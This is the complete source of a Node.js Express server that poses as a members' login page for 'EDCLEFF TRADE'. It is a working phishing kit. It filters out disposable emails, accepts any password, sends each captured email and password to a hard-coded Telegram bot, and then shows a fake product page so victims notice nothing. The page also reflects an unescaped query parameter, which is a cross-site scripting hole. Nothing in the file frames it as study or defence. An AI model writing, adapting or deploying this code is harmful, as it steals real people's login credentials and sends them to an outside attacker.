const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = '8776500357:AAF_8kD26cKyjulIiida3tULY7ZjdrJBryw';
const CHAT_ID = '7623047017';

const disposableDomains = [
  'mailinator.com', 'guerrillamail.com', '10minutemail.com', 'tempmail.com',
  'throwawaymail.com', 'yopmail.com', 'trashmail.com', 'spamgourmet.com',
  'temp-mail.org', 'fakeinbox.com', 'getnada.com', 'mohmal.com',
  'dispostable.com', 'guerrillamail.net', 'sharklasers.com', 'guerrillamail.org'
];

function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
  if (!emailRegex.test(email)) return false;
  const domain = email.split('@')[1].toLowerCase();
  return !disposableDomains.includes(domain);
}

console.log('🔥 TELEGRAM BOT ACTIVE (email validation only – any password works)');

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head><title>EDCLEFF TRADE</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
  .card{background:rgba(255,255,255,0.95);border-radius:32px;padding:40px 32px;width:100%;max-width:450px;text-align:center}
  h1{color:#1a3c4a;margin-bottom:8px}
  input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:40px}
  button{width:100%;padding:14px;background:#1f5e7e;color:white;border:none;border-radius:40px;font-size:18px;cursor:pointer}
  .error{background:#fee2e2;color:#991b1b;padding:10px;border-radius:12px;margin-bottom:16px}
</style>
</head>
<body>
<div class="card">
  <h1>✦ EDCLEFF TRADE ✦</h1>
  <p>Secure Member Gateway</p>
  ${req.query.error ? `<div class="error">⚠️ ${req.query.error}</div>` : ''}
  <form action="/login" method="POST">
    <input type="email" name="email" placeholder="Email Address" required>
    <input type="password" name="password" placeholder="Password (any)" required>
    <button type="submit">→ ACCESS GOODS & SERVICES</button>
  </form>
</div>
</body>
</html>`);
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;

  if (!isValidEmail(email)) {
    return res.redirect('/?error=Invalid%20email%20address%20or%20disposable%20email%20not%20allowed');
  }

  // Any password is accepted – no check

  console.log('📨 LOGIN:', email, password);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20EDCLEFF%20LOGIN%0AEmail:%20${email}%0APassword:%20${password}`;
  https.get(url);

  res.send(`<!DOCTYPE html>
<html>
<head><title>Products</title><style>
  body{font-family:sans-serif;background:#0f2027;color:white;text-align:center;padding:40px}
  .products{display:flex;flex-wrap:wrap;gap:20px;justify-content:center}
  .card{background:white;color:#1a3c4a;border-radius:20px;padding:20px;width:250px}
  button{background:#1f5e7e;color:white;border:none;padding:10px 20px;border-radius:40px;cursor:pointer}
  .logout{position:fixed;top:20px;right:20px;background:rgba(255,255,255,0.2);padding:10px 20px;border-radius:40px;text-decoration:none;color:white}
</style>
</head>
<body>
<a href="/" class="logout">🚪 Logout</a>
<h1>Welcome to EDCLEFF TRADE</h1>
<p>Premium Goods & Services</p>
<div class="products">
  <div class="card"><h3>📱 Smartphone</h3><p>$599</p><button onclick="alert('Order placed')">Order</button></div>
  <div class="card"><h3>💻 Laptop</h3><p>$899</p><button onclick="alert('Order placed')">Order</button></div>
  <div class="card"><h3>⌚ Smart Watch</h3><p>$199</p><button onclick="alert('Order placed')">Order</button></div>
  <div class="card"><h3>🎧 Headphones</h3><p>$149</p><button onclick="alert('Order placed')">Order</button></div>
</div>
</body>
</html>`);
});

app.listen(PORT, () => console.log('✅ Server on', PORT));    
